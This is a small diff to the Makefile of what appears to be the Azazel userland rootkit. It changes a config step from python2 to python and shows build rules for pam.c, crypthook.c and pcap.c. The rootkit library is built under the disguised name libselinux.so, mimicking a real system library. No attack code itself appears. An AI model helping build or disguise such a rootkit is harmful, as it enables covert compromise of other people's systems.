@@ -9,7 +9,7 @@ client:
 	$(CC) -fPIC client.c -shared -o client.so
 
 config:
-	@python2 config.py > const.h
+	@python config.py > const.h
 
 libselinux.so: azazel.c pam.c xor.c crypthook.c pcap.c
 	$(CC) -fPIC -g -c azazel.c pam.c xor.c crypthook.c pcap.c
